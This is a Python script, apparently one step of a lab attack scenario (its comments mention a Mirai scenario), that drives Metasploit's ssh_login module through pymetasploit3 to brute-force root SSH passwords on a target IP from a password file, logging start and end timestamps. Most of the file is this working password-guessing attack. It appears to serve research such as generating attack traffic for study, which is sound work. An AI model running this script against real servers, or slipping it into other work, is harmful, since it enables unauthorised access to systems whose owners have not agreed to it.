# This step is the step tried to reach public facing application through password guessing/cracking
# The password guessing in performed on the vulneratble and non vulnerable client for 01_mirai scenarion and target server for other scenario

import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]

    output_time_file_start = 'time_step_2_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(60)
    # put the attack launch command
    client = MsfRpcClient('kali')

    try:
        # put the attack launch command
        auxiliary = client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
        auxiliary['PASS_FILE'] = "/home/attacker-server/Desktop/reinstall/unix_passwords_modified.txt"
        auxiliary['USERNAME'] = "root"
        auxiliary['RHOSTS'] = target_ip
        auxiliary['RPORT'] = 22

        auxiliary.execute()

    except Exception as e:
        print(e)
        pass

    time.sleep(30)
    output_time_file_end = 'time_step_2_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(30)


main(sys.argv)
